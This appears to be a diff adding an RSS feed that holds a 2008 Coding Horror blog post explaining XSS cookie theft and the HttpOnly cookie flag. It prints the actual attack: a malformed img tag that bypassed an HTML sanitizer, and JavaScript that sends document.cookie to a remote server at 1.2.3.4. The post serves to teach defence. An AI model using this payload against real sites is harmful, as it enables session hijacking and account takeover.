@@ -1,0 +1,146 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0">
+<channel>
+<title>Coding Horror</title>
+<description>programming and human factors</description>
+<link>https://blog.codinghorror.com/</link>
+<pubDate>Sun, 19 Apr 2020 00:00:01 GMT</pubDate>
+<!-- other elements omitted from this example -->
+<item>
+<title>Protecting Your Cookies: HttpOnly</title>
+<link>https://blog.codinghorror.com/protecting-your-cookies-httponly/</link>
+<content>
+                <!--kg-card-begin: markdown--><p>
+So I have this friend. I've told him time and time again <a href="http://blog.stackoverflow.com/2008/06/safe-html-and-xss/">how dangerous XSS vulnerabilities are</a>, and how <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> is now <b>the most common of all publicly reported security vulnerabilities</b> -- dwarfing <a href="http://www.codinghorror.com/blog/archives/000841.html">old standards</a> like buffer overruns and SQL injection. But will he listen? No. He's hard headed. He had to go and write <a href="http://refactormycode.com/codes/333-sanitize-html">his own HTML sanitizer</a>. Because, well, how difficult can it be? How dangerous could this silly little toy scripting language running inside a <i>browser</i> be?
+</p>
+<p>
+As it turns out, far more dangerous than expected.
+</p>
+<p>
+To appreciate just how significant XSS hacks have become, think about how much of your life is lived online, and how exactly the websites you log into on a daily basis know who you are. It's all done with <a href="http://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookies</a>, right? Those tiny little identifiying headers sent up by the browser to the server on your behalf. They're the keys to your identity as far as the website is concerned.
+</p>
+<p>
+Most of the time when you accept input from the user the <i>very first thing you do</i> is pass it through a HTML encoder. So tricksy things like:
+</p>
+<p>
+</p>
+<pre>
+&lt;script&gt;alert('hello XSS!');&lt;/script&gt;
+</pre>
+<p>
+are automagically converted into their harmless encoded equivalents:
+</p>
+<pre>
+&amp;lt;script&amp;gt;alert('hello XSS!');&amp;lt;/script&amp;gt;
+</pre>
+<p>
+In my friend's defense (not that he deserves any kind of defense) the website he's working on allows some HTML to be posted by users. It's part of the design. It's a difficult scenario, because you can't just clobber every questionable thing that comes over the wire from the user. You're put in the uncomfortable position of having to discern good from bad, and decide what to do with the questionable stuff.
+</p>
+<p>
+Imagine, then, the surprise of my friend when he noticed some enterprising users on his website <b>were logged in as him</b> and happily banging away on the system with full unfettered administrative privileges.
+</p>
+<p>
+How did this happen? XSS, of course. It all started with this bit of script added to a user's profile page.
+</p>
+<p>
+</p>
+<pre>
+&lt;img src=""http://www.a.com/a.jpg&lt;script type=text/javascript
+src="http://1.2.3.4:81/xss.js"&gt;" /&gt;&lt;&lt;img
+src=""http://www.a.com/a.jpg&lt;/script&gt;"
+</pre>
+<p>
+Through clever construction, the malformed URL just manages to squeak past the sanitizer. The final rendered code, when viewed in the browser, loads and executes a script from that remote server. Here's what that JavaScript looks like:
+</p>
+<p>
+</p>
+<pre>
+window.location="http://1.2.3.4:81/r.php?u="
++document.links[1].text
++"&amp;l="+document.links[1]
++"&amp;c="+document.cookie;
+</pre>
+<p>
+That's right -- whoever loads this script-injected user profile page has just unwittingly <b>transmitted their browser cookies to an evil remote server!</b>
+</p>
+<p>
+As we've already established, once someone has your browser cookies for a given website, they essentially have the keys to the kingdom for your identity there. If you don't believe me, get the <a href="https://addons.mozilla.org/en-US/firefox/addon/573">Add N Edit cookies extension</a> for Firefox and try it yourself. Log into a website, copy the essential cookie values, then paste them into another browser running on another computer. That's all it takes. It's quite an eye opener.
+</p>
+<p>
+If cookies are so precious, you might find yourself asking why <b>browsers don't do a better job of protecting their cookies</b>. I know my friend was. Well, there is a way to protect cookies from most malicious JavaScript: HttpOnly cookies.
+</p>
+<p>
+When you tag a cookie with the HttpOnly flag, it tells the browser that <b>this particular cookie should only be accessed by the server</b>. Any attempt to access the cookie from client script is strictly forbidden. Of course, this presumes you have:
+</p>
+<p>
+</p>
+<ol>
+<li>A modern web browser
+</li>
+<li>A browser that actually implements HttpOnly correctly
+</li>
+</ol>
+<p>
+The good news is that most modern browsers do support the HttpOnly flag: Opera 9.5, Internet Explorer 7, and Firefox 3. I'm not sure if the latest versions of Safari do or not. It's sort of ironic that the HttpOnly flag was pioneered by Microsoft in hoary old Internet Explorer 6 SP1, a bowser which isn't exactly known for its iron-clad security record.
+</p>
+<p>
+Regardless, <b>HttpOnly cookies are a great idea, and properly implemented, make huge classes of common XSS attacks much harder to pull off.</b> Here's what a cookie looks like with the HttpOnly flag set:
+</p>
+<p>
+</p>
+<pre>
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: text/html; charset=utf-8
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Server: Microsoft-IIS/7.0
+<b>Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; <font color="red">HttpOnly</font></b>
+X-AspNet-Version: 2.0.50727
+<b>Set-Cookie: user=t=bfabf0b1c1133a822; path=/; <font color="red">HttpOnly</font></b>
+X-Powered-By: ASP.NET
+Date: Tue, 26 Aug 2008 10:51:08 GMT
+Content-Length: 2838
+</pre>
+<p>
+This isn't exactly news; Scott Hanselman <a href="http://www.hanselman.com/blog/HttpOnlyCookiesOnASPNET11.aspx">wrote about HttpOnly</a> a while ago. I'm not sure he understood the implications, as he was quick to dismiss it as "slowing down the average script kiddie for 15 seconds". In his defense, this was way back in 2005. A dark, primitive time. Almost pre YouTube.
+</p>
+<p>
+HttpOnly cookies can in fact be remarkably effective. Here's what we know:
+</p>
+<p>
+</p>
+<ul>
+<li>HttpOnly restricts all access to <code>document.cookie</code> in IE7, Firefox 3, and Opera 9.5 (unsure about Safari)
+</li>
+<li>HttpOnly removes cookie information from the response headers in <code>XMLHttpObject.getAllResponseHeaders()</code> in IE7. It should do the same thing in Firefox, but it doesn't, because <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=380418">there's a bug</a>.
+</li>
+<li>
+<code>XMLHttpObjects</code> may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.
+</li>
+</ul>
+<p>
+The big security hole, as alluded to above, is that Firefox (and presumably Opera) allow access to the headers through <code>XMLHttpObject</code>. So you could make a trivial JavaScript call back to the local server, get the headers out of the string, and then post that back to an external domain. Not as easy as <code>document.cookie</code>, but hardly a feat of software engineering.
+</p>
+<p>
+Even with those caveats, I believe HttpOnly cookies are a huge security win. If I -- er, I mean, if my friend -- had implemented HttpOnly cookies, <b>it would have totally protected his users from the above exploit!</b>
+</p>
+<p>
+HttpOnly cookies don't make you immune from XSS cookie theft, but they raise the bar considerably. It's practically free, a "set it and forget it" setting that's bound to become increasingly secure over time as more browsers follow the example of IE7 and implement client-side HttpOnly cookie security correctly. If you develop web applications, or you know anyone who develops web applications, <b>make sure they know about HttpOnly cookies.</b>
+</p>
+<p>
+Now I just need to go tell my friend about them. I'm not sure why I bother. He never listens to me anyway.
+</p>
+<p>
+(Special thanks to Shawn <i>expert developer</i> Simon for his assistance in constructing this post.)
+</p>
+<p>
+</p>
+<p></p>
+<!--kg-card-end: markdown-->
+            </content>
+<pubDate>2008-08-28T12:00:00.000Z</pubDate>
+<guid>https://blog.codinghorror.com/protecting-your-cookies-httponly/</guid>
+</item>
+</channel>
+</rss>
